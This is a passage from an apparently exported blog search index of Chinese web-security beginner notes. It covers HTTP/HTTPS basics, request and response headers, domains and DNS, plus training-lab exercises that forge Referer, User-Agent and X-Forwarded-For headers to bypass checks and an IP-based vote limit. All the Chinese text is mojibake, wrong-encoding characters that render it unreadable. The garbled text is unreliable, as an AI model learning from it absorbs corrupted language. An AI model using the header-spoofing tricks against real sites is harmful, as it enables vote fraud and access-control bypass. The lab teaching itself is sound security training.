å¯†ï¼Œä¿è¯æ•°æ®æœºå¯†æ€§ï¼›ç”¨åå•†çš„hashç®—æ³•è¿›è¡Œæ•°æ®å®Œæ•´æ€§ä¿æŠ¤ï¼Œä¿è¯æ•°æ®ä¸è¢«ç¯¡æ”¹ã€‚ HTTPå’ŒHTTPSçš„ç®€è¦é€šä¿¡è¿‡ç¨‹ HTTPï¼š 12345å»ºç«‹è¿æ¥â€”â€”&gt;å‘é€è¯·æ±‚æ•°æ®åŒ…â€”â€”&gt;è¿”å›å“åº”æ•°æ®åŒ…â€”â€”&gt;å…³é—­è¿æ¥1.æµè§ˆå™¨å»ºç«‹ä¸ web æœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥2.æµè§ˆå™¨å°†è¯·æ±‚æ•°æ®æ‰“åŒ…ï¼ˆç”Ÿæˆè¯·æ±‚æ•°æ®åŒ…ï¼‰å¹¶å‘é€åˆ° web æœåŠ¡å™¨3.web æœåŠ¡å™¨å°†å¤„ç†ç»“æœæ‰“åŒ…ï¼ˆç”Ÿæˆå“åº”æ•°æ®åŒ…ï¼‰å¹¶å‘é€ç»™æµè§ˆå™¨4.web æœåŠ¡å™¨å…³é—­è¿æ¥ HTTPSï¼š HTTP/HTTPS å…·ä½“åŒºåˆ«ï¼Ÿ HTTP æ˜æ–‡ä¼ è¾“ï¼Œæ•°æ®éƒ½æ˜¯æœªåŠ å¯†çš„ï¼Œå®‰å…¨æ€§è¾ƒå·®ï¼ŒHTTPSï¼ˆSSL+HTTPï¼‰ æ•°æ®ä¼ è¾“è¿‡ç¨‹æ˜¯åŠ å¯†çš„ï¼Œå®‰å…¨æ€§è¾ƒå¥½ã€‚ ä½¿ç”¨ HTTPS åè®®éœ€è¦åˆ° CAï¼ˆCertificate Authorityï¼Œæ•°å­—è¯ä¹¦è®¤è¯æœºæ„ï¼‰ ç”³è¯·è¯ä¹¦ï¼Œä¸€èˆ¬å…è´¹è¯ä¹¦è¾ƒå°‘ï¼Œå› è€Œéœ€è¦ä¸€å®šè´¹ç”¨ã€‚è¯ä¹¦é¢å‘æœºæ„å¦‚ï¼šSymantecã€Comodoã€GoDaddy å’Œ GlobalSign ç­‰ã€‚ HTTP é¡µé¢å“åº”é€Ÿåº¦æ¯” HTTPS å¿«ï¼Œä¸»è¦æ˜¯å› ä¸º HTTP ä½¿ç”¨ TCP ä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨éœ€è¦äº¤æ¢ 3 ä¸ªåŒ…ï¼Œè€Œ HTTPSé™¤äº† TCP çš„ä¸‰ä¸ªåŒ…ï¼Œè¿˜è¦åŠ ä¸Š ssl æ¡æ‰‹éœ€è¦çš„ 9 ä¸ªåŒ…ï¼Œæ‰€ä»¥ä¸€å…±æ˜¯ 12 ä¸ªåŒ…ã€‚ http å’Œ https ä½¿ç”¨çš„æ˜¯å®Œå…¨ä¸åŒçš„è¿æ¥æ–¹å¼ï¼Œç”¨çš„ç«¯å£ä¹Ÿä¸ä¸€æ ·ï¼Œå‰è€…æ˜¯ 80ï¼Œåè€…æ˜¯ 443ã€‚ HTTPS å…¶å®å°±æ˜¯å»ºæ„åœ¨ SSL/TLS ä¹‹ä¸Šçš„ HTTP åè®®ï¼Œæ‰€ä»¥ï¼Œè¦æ¯”è¾ƒ HTTPS æ¯” HTTP è¦æ›´è€—è´¹æœåŠ¡å™¨èµ„æºã€‚ Request è¯·æ±‚æ•°æ®åŒ…æ•°æ®æ ¼å¼1234è¯·æ±‚è¡Œï¼šè¯·æ±‚ç±»å‹/è¯·æ±‚èµ„æºè·¯å¾„ã€åè®®çš„ç‰ˆæœ¬å’Œç±»å‹è¯·æ±‚å¤´ï¼šä¸€äº›é”®å€¼å¯¹ï¼Œæµè§ˆå™¨ä¸ web æœåŠ¡å™¨ä¹‹é—´éƒ½å¯ä»¥å‘é€ï¼Œç‰¹å®šçš„æŸç§å«ä¹‰ç©ºè¡Œï¼šè¯·æ±‚å¤´ä¸è¯·æ±‚ä½“ä¹‹é—´ç”¨ä¸€ä¸ªç©ºè¡Œéš”å¼€ï¼›è¯·æ±‚ä½“ï¼šè¦å‘é€çš„æ•°æ®(ä¸€èˆ¬ post æäº¤ä¼šä½¿ç”¨)ï¼›ä¾‹ï¼šuser=123&amp;pass=123 ä¾‹å¦‚ï¼šRequest Headers 12345678910111213POST /adduser HTTP/1.1Host: localhost:8030Connection: keep-aliveContent-Length: 16Pragma: no-cacheCache-Control: no-cacheOrigin: chrome-extension://fdmmgilgnpjigdojojpjoooidkmcomcmUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/66.0.3359.181 Safari/537.36Content-Type: application/x-www-form-urlencodedAccept: */*Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9 è¯·æ±‚è¡Œè¯·æ±‚è¡Œç”±ä¸‰ä¸ªæ ‡è®°ç»„æˆï¼šè¯·æ±‚æ–¹æ³•ã€è¯·æ±‚ URL å’Œ HTTP ç‰ˆæœ¬ï¼Œå®ƒä»¬ç”¨ç©ºæ ¼åˆ†äº«ã€‚ ä¾‹å¦‚ï¼š 1GET /index.html HTTP/1.1 HTTP è§„åˆ’å®šä¹‰äº† 8 ç§å¯èƒ½çš„è¯·æ±‚æ–¹æ³•ï¼š 12345678GETï¼šæ£€ç´¢ URL ä¸­æ ‡è¯†èµ„æºçš„ä¸€ä¸ªç®€å•è¯·æ±‚HEADï¼šä¸ GET æ–¹æ³•ç›¸åŒï¼ŒæœåŠ¡å™¨åªè¿”å›çŠ¶æ€è¡Œå’Œå¤´æ ‡ï¼Œå¹¶ä¸è¿”å›è¯·æ±‚æ–‡æ¡£POSTï¼šæœåŠ¡å™¨æ¥å—è¢«å†™å…¥å®¢æˆ·ç«¯è¾“å‡ºæµä¸­çš„æ•°æ®çš„è¯·æ±‚PUTï¼šæœåŠ¡å™¨ä¿å­˜è¯·æ±‚æ•°æ®ä½œä¸ºæŒ‡å®š URL æ–°å†…å®¹çš„è¯·æ±‚DELETEï¼šæœåŠ¡å™¨åˆ é™¤ URL ä¸­å‘½ä»¤çš„èµ„æºçš„è¯·æ±‚OPTIONSï¼šå…³äºæœåŠ¡å™¨æ”¯æŒçš„è¯·æ±‚æ–¹æ³•ä¿¡æ¯çš„è¯·æ±‚TRACEï¼šweb æœåŠ¡å™¨åé¦ˆ Http è¯·æ±‚å’Œå…¶å¤´æ ‡çš„è¯·æ±‚CONNECT ï¼šå·²æ–‡æ¡£åŒ–ï¼Œä½†å½“å‰æœªå®ç°çš„ä¸€ä¸ªæ–¹æ³•ï¼Œé¢„ç•™åšéš§é“å¤„ç† è¯·æ±‚å¤´ç”±å…³é”®å­—/å€¼å¯¹ç»„æˆï¼Œæ¯è¡Œä¸€å¯¹ï¼Œå…³é”®å­—å’Œå€¼ç”¨å†’å·åˆ†äº«ã€‚è¯·æ±‚å¤´æ ‡é€šçŸ¥æœåŠ¡å™¨è…¾äºå®¢æˆ·ç«¯çš„åŠŸèƒ½å’Œæ ‡è¯†ã€‚ 1234567891011121314HOST: ä¸»æœºæˆ–åŸŸååœ°å€Acceptï¼šæŒ‡æµè§ˆå™¨æˆ–å…¶ä»–å®¢æˆ·å¯ä»¥æ¥çˆ±çš„ MIME æ–‡ä»¶æ ¼å¼ã€‚Servlet å¯ä»¥æ ¹æ®å®ƒåˆ¤æ–­å¹¶è¿”å›é€‚å½“çš„æ–‡ä»¶æ ¼å¼ã€‚User-Agentï¼šæ˜¯å®¢æˆ·æµè§ˆå™¨åç§°Hostï¼šå¯¹åº”ç½‘å€ URL ä¸­çš„ Web åç§°å’Œç«¯å£å·ã€‚Accept-Langeuageï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„è¯­è¨€ç§ç±»ï¼Œå¦‚ en æˆ– en-usï¼ŒæŒ‡è‹±è¯­ã€‚connectionï¼šç”¨æ¥å‘Šè¯‰æœåŠ¡å™¨æ˜¯å¦å¯ä»¥ç»´æŒå›ºå®šçš„ HTTP è¿æ¥ã€‚http æ˜¯æ— è¿æ¥çš„ï¼ŒHTTP/1.1 ä½¿ç”¨ Keep-Aliveä¸ºé»˜è®¤å€¼ï¼Œè¿™æ ·ï¼Œå½“æµè§ˆå™¨éœ€è¦å¤šä¸ªæ–‡ä»¶æ—¶(æ¯”å¦‚ä¸€ä¸ª HTML æ–‡ä»¶å’Œç›¸å…³çš„å›¾å½¢æ–‡ä»¶)ï¼Œä¸éœ€è¦æ¯æ¬¡éƒ½å»ºç«‹è¿æ¥Cookieï¼šæµè§ˆå™¨ç”¨è¿™ä¸ªå±æ€§å‘æœåŠ¡å™¨å‘é€ Cookieã€‚Cookie æ˜¯åœ¨æµè§ˆå™¨ä¸­å¯„å­˜çš„å°å‹æ•°æ®ä½“ï¼Œå®ƒå¯ä»¥è®°è½½å’ŒæœåŠ¡å™¨ç›¸å…³çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å®ç°ä¼šè¯åŠŸèƒ½ã€‚Refererï¼šè¡¨æ˜äº§ç”Ÿè¯·æ±‚çš„ç½‘é¡µURLã€‚å¦‚æ¯”ä»ç½‘é¡µ/icconcept/index.jspä¸­ç‚¹å‡»ä¸€ä¸ªé“¾æ¥åˆ°ç½‘é¡µ/icwork/search ï¼Œ åœ¨ å‘ æœ åŠ¡ å™¨ å‘ é€ çš„ GET/icwork/search ä¸­ çš„ è¯· æ±‚ ä¸­ ï¼Œ Referer æ˜¯http://hostname:8080/icconcept/index.jspã€‚è¿™ä¸ªå±æ€§å¯ä»¥ç”¨æ¥è·Ÿè¸ª Web è¯·æ±‚æ˜¯ä»ä»€ä¹ˆç½‘ç«™æ¥çš„ã€‚Content-Typeï¼šç”¨æ¥è¡¨å request çš„å†…å®¹ç±»å‹ã€‚å¯ä»¥ç”¨ HttpServletRequest çš„ getContentType()æ–¹æ³•å–å¾—ã€‚Accept-Charsetï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„å­—ç¬¦ç¼–ç ã€‚è‹±æ–‡æµè§ˆå™¨çš„é»˜è®¤å€¼æ˜¯ ISO-8859-1.Accept-Encodingï¼šæŒ‡å‡ºæµè§ˆå™¨å¯ä»¥æ¥å—çš„ç¼–ç æ–¹å¼ã€‚ç¼–ç æ–¹å¼ä¸åŒäºæ–‡ä»¶æ ¼å¼ï¼Œå®ƒæ˜¯ä¸ºäº†å‹ç¼©æ–‡ä»¶å¹¶åŠ é€Ÿæ–‡ä»¶ä¼ é€’é€Ÿåº¦ã€‚æµè§ˆå™¨åœ¨æ¥æ”¶åˆ° Web å“åº”ä¹‹åå…ˆè§£ç ï¼Œç„¶åå†æ£€æŸ¥æ–‡ä»¶æ ¼å¼ã€‚ ç©ºè¡Œæœ€åä¸€ä¸ªè¯·æ±‚å¤´æ ‡ä¹‹åæ˜¯ç©ºè¡Œï¼Œå‘é€å›è½¦ç¬¦å’Œé€€è¡Œï¼Œé€šçŸ¥æœåŠ¡å™¨ä»¥ä¸‹ä¸å†æœ‰å¤´æ ‡ã€‚ è¯·æ±‚æ•°æ®ä½¿ç”¨ POST ä¼ é€ï¼Œæœ€å¸¸ä½¿ç”¨çš„æ˜¯ Content-Type å’Œ Content-Length å¤´æ ‡ã€‚ Response è¿”å›æ•°æ®åŒ…æ•°æ®æ ¼å¼ä¸€ä¸ªå“åº”ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼›çŠ¶æ€è¡Œã€å“åº”å¤´æ ‡ã€ç©ºè¡Œã€å“åº”æ•°æ®ã€‚ 1234çŠ¶æ€è¡Œï¼šåè®®ç‰ˆæœ¬ã€æ•°å­—å½¢å¼çš„çŠ¶æ€ä»£ç å’ŒçŠ¶æ€æè¿°ï¼Œä¸ªå…ƒç´ ä¹‹é—´ä»¥ç©ºæ ¼åˆ†éš”å“åº”å¤´æ ‡ï¼šåŒ…å«æœåŠ¡å™¨ç±»å‹ã€æ—¥æœŸã€é•¿åº¦ã€å†…å®¹ç±»å‹ç­‰ç©ºè¡Œï¼šå“åº”å¤´ä¸å“åº”ä½“ä¹‹é—´ç”¨ç©ºè¡Œéš”å¼€å“åº”æ•°æ®ï¼šæµè§ˆå™¨ä¼šå°†å®ä½“å†…å®¹ä¸­çš„æ•°æ®å–å‡ºæ¥ï¼Œç”Ÿæˆç›¸åº”çš„é¡µé¢ HTTP å“åº”ç ï¼š123451xxï¼šä¿¡æ¯ï¼Œè¯·æ±‚æ”¶åˆ°ï¼Œç»§ç»­å¤„ç†2xxï¼šæˆåŠŸï¼Œè¡Œä¸ºè¢«æˆåŠŸåœ°æ¥å—ã€ç†è§£å’Œé‡‡çº³3xxï¼šé‡å®šå‘ï¼Œä¸ºäº†å®Œæˆè¯·æ±‚ï¼Œå¿…é¡»è¿›ä¸€æ­¥æ‰§è¡Œçš„åŠ¨ä½œ4xxï¼šå®¢æˆ·ç«¯é”™è¯¯5xxï¼šæœåŠ¡å™¨é”™è¯¯ å“åº”å¤´æ ‡æƒ³è¯·æ±‚å¤´æ ‡ä¸€æ ·ï¼Œä»–ä»¬æŒ‡å‡ºæœåŠ¡å™¨çš„åŠŸèƒ½ï¼Œæ ‡è¯†å‡ºå“åº”æ•°æ®çš„ç»†èŠ‚ ç©ºè¡Œæœ€åä¸€ä¸ªå“åº”å¤´æ ‡ä¹‹åæ˜¯ä¸€ä¸ªç©ºè¡Œï¼Œå‘é€å›è½¦é—´å’Œé€€è¡Œï¼Œè¡¨æ˜æœåŠ¡å™¨ä»¥ä¸‹ä¸å†æœ‰å¤´æ ‡ å“åº”æ•°æ®HTMLæ–‡æ¡£å’Œå›¾åƒç­‰ï¼Œä¹Ÿæ˜¯HTMLæœ¬èº« æ¼”ç¤ºæ¡ˆä¾‹Burp Suite æŠ“åŒ… ç¬¬ä¸‰æ–¹æ£€æµ‹ä¿®æ”¹å®ç°XSSæ”»å‡»å·²ç»è¢«ä¿®å¤äº†ã€‚ æ¥æºé¡µä¼ªé€ https://www.mozhe.cn/bug/detail/56 åœ¨burpä¸Šè¿›è¡ŒæŠ“åŒ…è¿›è¡Œæ¥æºé¡µå—ä¿®æ”¹ ä¿®æ”¹Refererå‚æ•°ï¼Œåœ°å€æ¥æº æµè§ˆå™¨ä¿¡æ¯ä¼ªé€  éœ€è¦ä¼ªé€ IPhoneæ‰‹æœºå’Œ2Gä¿¡å· é€šè¿‡ä¼ªé€ User-Agentæ¥å®ç° 1Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X)AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0NetType/2G æˆåŠŸä¼ªé€  HTTPåŠ¨ä½œç»ƒä¹ è¿™é‡Œåº”è¯¥æ˜¯éœ€è¦å°†GETæ–¹å¼æ”¹ä¸ºPOSTæ–¹å¼ï¼ŒbpæŠ“åŒ…ç„¶åé€‰æ‹©å˜æ›´è¯·æ±‚æ–¹å¼ï¼Œç„¶åå‘åŒ…ã€‚ æŠ•ç¥¨ç³»ç»Ÿç¼ºé™·è¦æ±‚è®©gggè·å¾—ç¬¬ä¸€ã€‚ æŠ“ä¸€ä¸‹åŒ…çœ‹ä¸€ä¸‹ã€‚åº”è¯¥æ˜¯é€šè¿‡ipå»é™åˆ¶æŠ•ç¥¨æ¬¡æ•°ï¼Œè¿™é‡Œä½¿ç”¨X-Forwarded-Foræ¥ä¼ªé€ ipï¼Œç„¶åå°±å¯ä»¥æ— é™æŠ•ç¥¨äº†ã€‚ æˆåŠŸå¾—åˆ°ç¬¬ä¸€","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://al0nez.github.io/tags/Web/"},{"name":"å°è¿ªå­¦ä¹ ç¬”è®°","slug":"å°è¿ªå­¦ä¹ ç¬”è®°","permalink":"https://al0nez.github.io/tags/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"åŸºç¡€å…¥é—¨","slug":"åŸºç¡€å…¥é—¨","permalink":"https://al0nez.github.io/tags/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"}]},{"title":"01åŸºç¡€å…¥é—¨--æ¦‚å¿µåè¯","slug":"01åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯","date":"2021-09-10T07:15:08.000Z","updated":"2021-09-21T06:06:22.407Z","comments":true,"path":"2021/09/10/01åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯/","link":"","permalink":"https://al0nez.github.io/2021/09/10/01%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%A6%82%E5%BF%B5%E5%90%8D%E8%AF%8D/","excerpt":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†","text":"ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜† åŸŸåä»€ä¹ˆæ˜¯åŸŸååŸŸåï¼ˆDomain namesï¼‰æ˜¯äº’è”ç½‘åŸºç¡€æ¶æ„çš„å…³é”®éƒ¨åˆ†ã€‚å®ƒä»¬ä¸ºäº’è”ç½‘ä¸Šä»»ä½•å¯ç”¨çš„ç½‘é¡µæœåŠ¡å™¨æä¾›äº†æ–¹ä¾¿äººç±»ç†è§£çš„åœ°å€ã€‚ ä»»ä½•è¿ä¸Šäº’è”ç½‘çš„ç”µè„‘éƒ½å¯ä»¥é€šè¿‡ä¸€ä¸ªå…¬å…±IPåœ°å€è®¿é—®åˆ°ï¼Œå¯¹äºIPv4åœ°å€æ¥è¯´ï¼Œè¿™ä¸ªåœ°å€æœ‰32ä½ï¼ˆå®ƒä»¬é€šå¸¸å†™æˆå››ä¸ªèŒƒå›´åœ¨0~255ä»¥å†…ï¼Œç”±ç‚¹åˆ†éš”çš„æ•°å­—ç»„æˆï¼Œæ¯”å¦‚173.194.121.32ï¼‰ï¼Œè€Œå¯¹äºIPv6æ¥è¯´ï¼Œè¿™ä¸ªåœ°å€æœ‰128ä½ï¼Œé€šå¸¸å†™æˆå…«ç»„ç”±å†’å·åˆ†éš”çš„å››ä¸ªåå…­è¿›åˆ¶æ•°(e.g., 2027:0da8:8b73:0000:0000:8a2e:0370:1337). è®¡ç®—æœºå¯ä»¥å¾ˆå®¹æ˜“åœ°å¤„ç†è¿™äº›IPåœ°å€, ä½†æ˜¯å¯¹ä¸€ä¸ªäººæ¥è¯´å¾ˆéš¾æ‰¾å‡ºè°åœ¨æ“æ§è¿™äº›æœåŠ¡å™¨ä»¥åŠè¿™äº›ç½‘ç«™æä¾›ä»€ä¹ˆæœåŠ¡ã€‚IP åœ°å€å¾ˆéš¾è®°å¿†è€Œä¸”å¯èƒ½ä¼šéšç€æ—¶é—´çš„æ¨ç§»å‘ç”Ÿæ”¹å˜ ã€‚ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬ä½¿ç”¨æ–¹ä¾¿è®°å¿†çš„åœ°å€ï¼Œç§°ä½œåŸŸåã€‚ åŸŸååœ¨å“ªé‡Œæ³¨å†ŒåŸŸåæ³¨å†Œæ˜¯Internetä¸­ç”¨äºè§£å†³åœ°å€å¯¹åº”é—®é¢˜çš„ä¸€ç§æ–¹æ³•ã€‚æ ¹æ®ä¸­å›½äº’è”ç½‘ç»œåŸŸåç®¡ç†åŠæ³•ï¼ŒåŸŸåæ³¨å†ŒæœåŠ¡æœºæ„åŠåŸŸåæ³¨å†Œç®¡ç†æœºæ„éœ€å¯¹ç”³è¯·äººæå‡ºçš„åŸŸåæ˜¯å¦è¿åäº†ç¬¬ä¸‰æ–¹çš„æƒåˆ©å’Œç”³è¯·äººçš„çœŸå®èº«ä»½è¿›è¡Œæ ¸éªŒã€‚æ¯ä¸€ä¸ªç›¸åŒé¡¶çº§åŸŸåä¸­çš„äºŒçº§åŸŸåæ³¨å†Œéƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œä¸å¯é‡å¤çš„ï¼Œä½†ä¸åŒé¡¶çº§åŸŸåä¸­çš„äºŒçº§åŸŸåå¯ä»¥æ˜¯ç›¸åŒçš„ï¼Œä¾‹å¦‚baiduè¿™ä¸ªäºŒçº§åŸŸåæ›¾å¯ä»¥åœ¨.comä¸­æ³¨å†Œï¼Œä¹Ÿå¯ä»¥åœ¨.cnä¸­æ³¨å†Œï¼Œä¹Ÿå¯ä»¥åœ¨.xyzä¸­åŠå…¶ä»–å¤šç§é¡¶çº§åŸŸåä¸­æ³¨å†Œï¼Œä¸”æ¯ä¸ªåŸŸåéƒ½èµ·åˆ°åŒæ ·çš„ä½œç”¨ã€‚å› æ­¤ï¼Œåœ¨ç½‘ç»œä¸ŠåŸŸåæ˜¯ä¸€ç§ç›¸å¯¹æœ‰é™çš„èµ„æºï¼Œå®ƒçš„ä»·å€¼éšç€æ³¨å†Œä¼ä¸šå’Œä¸ªäººç”¨æˆ·çš„å¢å¤šè€Œé€æ­¥ä¸ºäººä»¬æ‰€é‡è§†ã€‚ä¸€èˆ¬åŸŸåéœ€è¦é€šè¿‡åŸŸåæ³¨å†Œå•†å»æ³¨å†Œã€‚ é¡¶çº§åŸŸåã€ä¸€çº§åŸŸå1234567891011121314151617Top-level domainsï¼Œfirst-level domainsï¼ˆTLDsï¼‰ï¼Œä¹Ÿç¿»è¯‘ä¸ºå›½é™…é¡¶çº§åŸŸåï¼Œä¹Ÿæˆä¸€çº§åŸŸåã€‚ .com ä¾›å•†ä¸šæœºæ„ä½¿ç”¨ï¼Œä½†æ— é™åˆ¶æœ€å¸¸ç”¨ .net åŸä¾›ç½‘ç»œæœåŠ¡ä¾›åº”å•†ä½¿ç”¨ï¼Œç°æ— é™åˆ¶ .org åŸä¾›ä¸å±äºå…¶ä»–é€šç”¨é¡¶çº§åŸŸç±»åˆ«çš„ç»„ç»‡ä½¿ç”¨ï¼Œç°æ— é™åˆ¶ .edu / .gov / .mil ä¾›ç¾å›½æ•™è‚²æœºæ„/ç¾å›½æ”¿åºœæœºå…³/ç¾å›½å†›äº‹æœºæ„ã€‚å› å†å²é—ç•™é—®é¢˜ä¸€èˆ¬åªåœ¨ç¾å›½ä¸“ç”¨ .aero ä¾›èˆªç©ºè¿è¾“ä¸šä½¿ç”¨ .biz ä¾›å•†ä¸šä½¿ç”¨ .coop ä¾›è”åˆä¼šï¼ˆcooperativesï¼‰ä½¿ç”¨ .info ä¾›ä¿¡æ¯æ€§ç½‘ç«™ä½¿ç”¨ï¼Œä½†æ— é™åˆ¶ .museum ä¾›åšç‰©é¦†ä½¿ç”¨ .name ä¾›å®¶åº­åŠä¸ªäººä½¿ç”¨ .pro ä¾›éƒ¨åˆ†ä¸“ä¸šä½¿ç”¨ .asia ä¾›äºšæ´²ç¤¾åŒºä½¿ç”¨ .tel ä¾›è¿æ¥ç”µè¯ç½‘ç»œä¸å› ç‰¹ç½‘çš„æœåŠ¡ä½¿ç”¨ .post ä¾›é‚®æ”¿æœåŠ¡ä½¿ç”¨ .mail ä¾›é‚®ä»¶ç½‘ç«™ä½¿ç”¨ å›½å®¶é¡¶çº§åŸŸåï¼šcnï¼ˆä¸­å›½å¤§é™†ï¼‰ã€deï¼ˆå¾·å›½ï¼‰ã€euï¼ˆæ¬§ç›Ÿï¼‰ã€jpï¼ˆæ—¥æœ¬ï¼‰ã€hkï¼ˆä¸­å›½é¦™æ¸¯ï¼‰ã€twï¼ˆä¸­å›½å°æ¹¾ï¼‰ã€ukï¼ˆè‹±å›½ï¼‰ã€usï¼ˆç¾å›½ï¼‰ ä»€ä¹ˆæ˜¯äºŒçº§åŸŸåå¤šçº§åŸŸåï¼ŸäºŒçº§åŸŸï¼ˆæˆ–ç§°äºŒçº§åŸŸåï¼›è‹±è¯­ï¼šSecond-level domainï¼›è‹±æ–‡ç¼©å†™ï¼šSLDï¼‰æ˜¯äº’è”ç½‘DNSç­‰çº§ä¹‹ä¸­ï¼Œå¤„äºé¡¶çº§åŸŸåä¹‹ä¸‹çš„åŸŸã€‚äºŒçº§åŸŸåæ˜¯åŸŸåçš„å€’æ•°ç¬¬äºŒä¸ªéƒ¨åˆ†ï¼Œä¾‹å¦‚åœ¨åŸŸåexample.baidu.comä¸­ï¼ŒäºŒçº§åŸŸåæ˜¯Baiduã€‚ .com é¡¶çº§åŸŸå/ä¸€çº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«é¡¶çº§åŸŸ baidu.com äºŒçº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«äºŒçº§åŸŸ tieba.baidu.com ä¸‰çº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«ä¸‰çº§åŸŸ detail.tieba.baidu.com å››çº§åŸŸåï¼Œæ›´å‡†ç¡®çš„è¯´å«å››çº§åŸŸ â€¦â€¦. åŸŸåå‘ç°å¯¹äºå®‰å…¨æµ‹è¯•æ„ä¹‰ï¼Ÿ è¿›è¡Œæ¸—é€æµ‹è¯•æ—¶ï¼Œå…¶ä¸»åŸŸåæ‰¾ä¸åˆ°æ¼æ´æ—¶ï¼Œå°±å¯ä»¥å°è¯•å»æµ‹è¯•æ”¶é›†åˆ°çš„å­åŸŸåï¼Œæœ‰å¯èƒ½æµ‹è¯•å­åŸŸåç½‘ç«™æ—¶ä¼šæœ‰æ„å‘ä¸åˆ°çš„æ•ˆæœï¼Œç„¶åå¯ä»¥ç”±æ­¤æ¨ªå‘åˆ°ä¸»ç½‘ç«™ã€‚ DNSä»€ä¹ˆæ˜¯DNSï¼ŸDNSï¼ˆDomain Name Serverï¼ŒåŸŸåæœåŠ¡å™¨ï¼‰æ˜¯è¿›è¡ŒåŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)è½¬æ¢çš„æœåŠ¡å™¨ã€‚DNSä¸­ä¿å­˜äº†ä¸€å¼ åŸŸå(domain name)å’Œä¸ä¹‹ç›¸å¯¹åº”çš„IPåœ°å€ (IP address)çš„è¡¨ï¼Œä»¥è§£ææ¶ˆæ¯çš„åŸŸåã€‚ ä¾‹å¦‚ç™¾åº¦çš„åŸŸåæ˜¯www.baidu.com,åœ¨DNSä¸­å¯¹åº”çš„IPæ˜¯1.2.3.4(å‡è®¾),é‚£ä¹ˆæˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è¾“å…¥ç™¾åº¦çš„åŸŸåï¼ŒDNSå°±ä¼šè§£æä¸º1.2.3.4ã€‚ æœ¬åœ°HOSTSä¸DNSçš„å…³ç³»ï¼Ÿå®¢æˆ·ç«¯æŸ¥è¯¢DNSçš„è¿‡ç¨‹æ˜¯ï¼š 1æœ¬åœ°hostæ–‡ä»¶â€”æœ¬åœ°ç¼“å­˜â€”-DNSæœåŠ¡å™¨ Hostsæ–‡ä»¶ç›®å½• 1åœ¨Windowsä¸­ï¼Œå®ƒçš„ç›®å½•é€šå¸¸åœ¨Cç›˜çš„Windows\\system32\\drivers\\etc\\ä¸‹ã€‚ Hostsæ–‡ä»¶æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬å°±å¯ä»¥å°†å…¶æ‰“å¼€ã€‚è¿™ä¸ªæ–‡ä»¶æ˜¯æ ¹æ®TCP/IP for Windows çš„æ ‡å‡†æ¥å·¥ä½œçš„ï¼Œå®ƒçš„ä½œç”¨æ˜¯åŒ…å«IPåœ°å€å’ŒHost name(ä¸»æœºå)çš„æ˜ å°„å…³ç³»ï¼Œæ¯æ®µåªèƒ½åŒ…æ‹¬ä¸€ä¸ªæ˜ å°„å…³ç³»ï¼ŒIPåœ°å€è¦æ”¾åœ¨æ¯æ®µçš„æœ€å‰é¢ï¼Œåé¢å†™Host name(ä¸»æœºå)ï¼Œä¸­é—´åŠ ä¸ªç©ºæ ¼ã€‚å¦‚ï¼š127.0.0.1 localhost. æˆ‘ä»¬çŸ¥é“ï¼Œå½“ç”µè„‘è®¿é—®ç½‘ç«™æ—¶ï¼Œé¦–å…ˆé€šè¿‡DNSæœåŠ¡å™¨æŠŠç½‘ç»œ åŸŸåè§£ææˆIPåœ°å€åï¼Œæˆ‘ä»¬çš„è®¡ç®—æœºæ‰èƒ½è®¿é—®ã€‚å¦‚æœæ¯ä¸ªåŸŸåè¯·æ±‚éƒ½è¦ç­‰å¾…åŸŸåæœåŠ¡å™¨è§£æåè¿”å›IPï¼Œè®¿é—®é€Ÿåº¦å°±ä¼šæ¯”è¾ƒæ…¢ï¼Œè€ŒHostsæ–‡ä»¶æ­£å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚åœ¨è¿›è¡ŒDNSè¯·æ±‚ä»¥å‰ï¼ŒWindowsç³»ç»Ÿä¼šå…ˆæ£€æŸ¥Hostsæ–‡ä»¶ä¸­æ˜¯å¦æœ‰è¿™ä¸ªåœ°å€æ˜ å°„å…³ç³»ï¼Œå¦‚æœæœ‰åˆ™è°ƒç”¨è¿™ä¸ªIPåœ°å€æ˜ å°„ï¼Œå¦‚æœæ²¡æœ‰å†å‘DNSæœåŠ¡å™¨æå‡ºåŸŸåè§£æã€‚ egï¼šè¿™é‡Œç”¨æˆ‘è‡ªå·±çš„åšå®¢åœ°å€ä½œä¸ºæ¼”ç¤ºï¼Œå½“æˆ‘ä»¬ping l0ne1y.github.ioçš„æ—¶å€™å¯ä»¥çœ‹åˆ°ä»–çš„ipåœ°å€æ˜¯185.199.110.153ã€‚ å½“æˆ‘ä»¬ä¿®æ”¹äº†æœ¬åœ°hostsæ–‡ä»¶åï¼Œå†æ¬¡ping 